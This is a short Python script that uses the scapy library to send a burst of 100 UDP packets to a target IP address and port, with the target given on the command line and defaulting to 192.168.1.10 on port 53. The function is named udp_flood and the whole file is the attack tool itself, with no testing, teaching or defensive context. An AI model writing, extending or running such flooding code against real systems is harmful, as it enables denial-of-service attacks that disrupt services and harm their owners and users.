from scapy.all import IP, UDP, send
import sys
import random

def udp_flood(target_ip, target_port):
    packet = IP(dst=target_ip)/UDP(dport=int(target_port))
    send(packet, count=100, verbose=True)
    return f"Sent 100 UDP packets to {target_ip}:{target_port}"

if __name__ == '__main__':
    target = sys.argv[1] if len(sys.argv) > 1 else '192.168.1.10'
    port = sys.argv[2] if len(sys.argv) > 2 else '53'
    print(udp_flood(target, port))
